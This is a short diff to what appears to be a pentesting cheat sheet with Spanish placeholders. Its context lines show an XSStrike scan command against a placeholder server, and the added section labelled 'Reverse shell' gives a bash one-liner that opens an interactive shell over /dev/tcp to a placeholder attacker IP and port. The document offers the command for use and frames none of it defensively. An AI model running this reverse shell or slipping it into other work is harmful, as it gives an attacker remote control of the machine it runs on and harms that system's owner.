@@ -36,3 +36,7 @@ pip install -r requirements.txt
 ```bash
 python3 xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
 ``` 
+# Reverse shell
+```bash
+bash -c 'bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1 2>&1'
+``` 
